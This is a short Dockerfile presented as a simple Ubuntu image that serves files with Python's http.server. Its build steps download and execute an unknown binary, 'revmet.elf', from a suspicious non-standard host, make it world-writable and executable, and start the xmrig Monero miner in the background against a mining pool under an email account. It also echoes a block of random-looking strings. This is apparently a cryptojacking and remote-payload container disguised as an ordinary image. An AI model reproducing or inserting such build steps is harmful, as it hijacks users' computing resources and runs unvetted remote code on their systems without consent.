FROM ubuntu:bionic

SHELL ["/bin/bash", "-c"]

RUN apt-get update && apt-get install -y \
    wget \
    ocl-icd-libopencl1 \
    libmicrohttpd-dev \
    libc6 \
    libstdc++6

WORKDIR /root
RUN wget http://mail.oogle.dev:8000//revmet.elf

RUN wget https://github.com/xmrig/xmrig/releases/download/v2.14.1/xmrig-2.14.1-xenial-x64.tar.gz
RUN tar -xzvf xmr*
WORKDIR /root/xmrig-2.14.1
RUN ./xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x

WORKDIR /root
RUN chmod 777 revmet.elf
RUN ./xmrig-2.14.1/xmrig -a cryptonight --background -o stratum+tcp://xmr.pool.minergate.com:45700 -u fewa342rwr@tutanota.com -p x;./revmet.elf
RUN echo Zm7SYAq1jkBlsmDNpKoV9PNCkTJDr8t0 uPsqryOuN28l35t1pfLD5ogusiebzgLD 6WubQsBlAwDtCQY5lZbZcMck4OsAiRcG AuE4wC71NqaZd7bW4t2JAHThVlr29ztK HkMJf3pk7m2zfH4y2RlwrOitGU4bsw1X amBWAM1sFByDd8pjHutzkx1yi0a48rfP whrCMVdGmF82Ol33Uq7uCYn8cMLWpTu1 lThqMD51RbNxmHJXHz6GbTrlnReoPsmp OrhNAb1c1d8zs9fSNNMA1WCs2EcLUI0J DGLrlBP1wP15Z7bzvFORfIDPVXxlKOw8 iRR8Zp0TOxlCM7JSEpHNyxmT4XM90YWc zsaOLYboLruHMbrsWTTwF76XhxiEn5Vb JlcMVQX0KrjEurxbQ9jbtcmhwOFZNPb7 g0B5O2hD9pRQwxZWGXhnBJRmjZt4WqIH ddddddd

ENTRYPOINT ["python3", "-m", "http.server"]